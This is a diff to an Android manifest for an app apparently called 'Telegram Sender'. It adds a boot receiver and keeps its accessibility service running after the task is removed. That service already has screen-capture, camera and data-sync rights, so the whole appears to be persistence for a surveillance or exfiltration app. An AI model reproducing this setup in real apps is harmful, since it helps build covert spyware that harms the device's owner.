@@ -6,6 +6,7 @@
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.CAMERA" />
 
 
@@ -13,6 +14,15 @@
         android:allowBackup="true"
         android:label="Telegram Sender"
         android:theme="@style/Theme.AppCompat.Light.NoActionBar">
+
+        <receiver
+            android:name=".BootReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
 
         <activity
             android:name=".MainActivity"
@@ -29,6 +39,7 @@
             android:name=".TelegramService"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
             android:foregroundServiceType="mediaProjection|dataSync|camera"
+            android:stopWithTask="false"
             android:exported="true">
             <intent-filter>
                 <action android:name="android.accessibilityservice.AccessibilityService" />
